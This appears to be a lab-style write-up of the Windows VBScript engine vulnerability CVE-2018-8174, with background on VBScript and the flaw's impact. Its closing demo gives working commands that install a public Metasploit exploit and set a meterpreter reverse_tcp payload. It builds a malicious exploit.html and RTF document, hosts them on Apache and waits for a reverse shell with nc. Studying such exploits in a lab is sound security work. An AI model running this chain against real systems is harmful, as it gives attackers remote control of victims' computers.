Windows VBScript Engine Remote Code Execution Vulnerability(CVE-2018-8174)
==== 
# Descriptions

Due to the code execution vulnerability in the VBScript script execution engine (vbscript.dll), an attacker can embed malicious VBScript into Office files or websites. Once the user accidentally clicks, a remote attacker can obtain the current user permission to execute the malicious code in the script; the vulnerability affects the latest version of the IE browser and applications that use the IE kernel. <br><br>
Users may be attacked when browsing the web or opening Office documents, and eventually, hackers implanted backdoor Trojans to take complete control of the computer. In a web-based attack scenario, an attacker could exploit the vulnerability of a specific website through Internet Explorer and then convince the user to view the website. An attacker could also embed ActiveX controls marked as "safe to initialize" in an application or Microsoft Office document that hosts the IE rendering engine. Attackers can also use compromised websites and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit this vulnerability[^1].<br><br>
The chart below shows the CVEs and number of URLs seen leveraging the respective CVEs at 2018 Q2.
![](https://unit42.paloaltonetworks.com/wp-content/uploads/2018/09/Figure_2-1.png)  
CVE-2018-8174 is a code execution vulnerability in the Microsoft VBScript engine detected as a zero-day attack and patched by Microsoft in May 2018. This vulnerability was not publicly known until the second quarter, and we can see it was quickly used by attackers taking advantage of it, making it number two on our list in the second quarter, exploited by 291 malicious URLs.[^2]<br><br>

Basic Information:[^3][^4][^5]<br>

| CVE      | Products Affected by CVE    | CVSS Score (NVD)     | Examples of Threat Actors    | Attack Vector     | Attack Complexity  | User Interaction  | Confidentiality  |
| ---------- | :-----------:  | :-----------: | :-----------:  | :-----------:  | :-----------:  | :-----------:  |   :-----------:  |
| CVE-2018-8174r    | Microsoft Window     | 7.5      | Silent Group, Dark Hotel APT   | Network  | High  | Required  | High  |




# What is the VBScript Engine?

VBScript Engine is one of the VBScript scripting language engines. It is a lightweight interpreted language in the Microsoft environment. It uses COM components, WMI, WSH, ADSI to access elements in the system and manage the system. At the same time, it is the default programming language for asp dynamic web pages. With asp built-in objects and ADO objects, users can quickly master the asp dynamic web page development technology for accessing databases.<br>

#### pros
- Programs can be directly executed through text editor
- Case insensitive, simple syntax, easy to learn and to implement.
- Performs the addition of interactive activities to Web pages.

#### cons

- VBscript is used only by IE. 
- VBScript don't have enough command line support.
- Since there is no development environment available by default, debugging is difficult.[^6]
-
# What is VBScript used for? 

* VBScript is used to give functionality and interaction to web pages.
* VBScript can be used for client-side scripting. However, only Internet Explorer can interpret it. 
* VBS can also be used for server-side scripting. This requires the use of a Microsoft web server such as Personal Web Server (PWS), or Internet Information Server (IIS) and a packaging such as Active Server Pages (ASP).[^7]

# What could this vulnerability affect?

The vulnerability could corrupt memory, allowing an attacker to execute arbitrary code in the current user's context. An attacker who successfully exploited this vulnerability could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited the vulnerability could take control of an affected system. An attacker could then install programs, view, change, delete, create new accounts with full user rights.[^5]<br>

In a web-based attack scenario, an attacker could host a specially crafted website designed to exploit the vulnerability through Internet Explorer and then convince users to view the website. An attacker could also embed ActiveX controls marked "safe for initialization" in an application or Microsoft Office document that hosts the IE rendering engine. Attackers can also use compromised websites and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit this vulnerability.<br>

# A Practice of VBscript Attack

## Specifications
Attacker Machine: Kali Linux
Tool: Metasploit-Framework
Victim Machine: 64 bits Windows 7

## Demo
- Download [Kali](https://www.kali.org/get-kali/) Virtual Machine where it has built-in metasploit-framework that we are going to use.
- Download the exploit module inside the Kali Virtual Machine.
```bash
git clone https://github.com/0x09AL/CVE-2018-8174-msf
```
- Copied to the corresponding exploit module directory. (Notice: The original file format with “-” will reporting error so change it to “_” instead.)
```bash
cd CVE-2018-8174-msf/
cp CVE-2018-8174.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat/cve_2018_8174.rb
cp CVE-2018-8174.rtf /usr/share/metasploit-framework/data/exploits/
```
- Now we enter the msfconsole with
```bash
msfconsole
```
- Then we use the module and set up srvhost and lhost, notice that srvhost and lhost are the same as your IP address
```bash
use exploit/windows/fileformat/cve_2018_8174
set PAYLOAD windows/meterpreter/reverse_tcp
set srvhost 192.168.1.111
set lhost 192.168.1.111
exploit
```
- Now we download the VBscript with (Attention, you may need to run this file as ROOT user so do `sudo su` first)
```bash
git clone https://github.com/Yt1g3r/CVE-2018-8174_EXP
```
- Run the VBscript script, once it completed it will generate a malicious html template called "exploit.html" and a file named "msf.rtf" which is a malicious file that can be opening with Microsoft Word & Microsoft Office.
```bash
python CVE-2018-8174.py -u 192.168.1.111/exploit.html -o msf.rtf -i 192.168.1.111 -p 4444
```
- Lastly, we start out the apache server, copy & send the the VBscript html and be prepare to attack by listening port 4444
```bash
systemctl start apache2
cp exploit.html /var/www/html
nc -lvvp 4444
```
# Reference 
[^1]: https://www.rapid7.com/db/vulnerabilities/msft-cve-2018-8174/
[^2]: https://unit42.paloaltonetworks.com/unit42-web-based-threats-2018-q2-u-s-remains-1-malicious-web-addresses-china-falls-2-7/
[^3]: https://blog.qualys.com/product-tech/2019/12/27/top-19-vulnerability-cves-in-santas-dashboard-tracking
[^4]: https://nvd.nist.gov/vuln/detail/CVE-2018-8174
[^5]: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2018-8174
[^6]:https://www.tutorialspoint.com/vbscript/vbscript_overview.htm
[^7]: https://www.cse.fau.edu/~roy/cop4020.01c/VBScript.htm







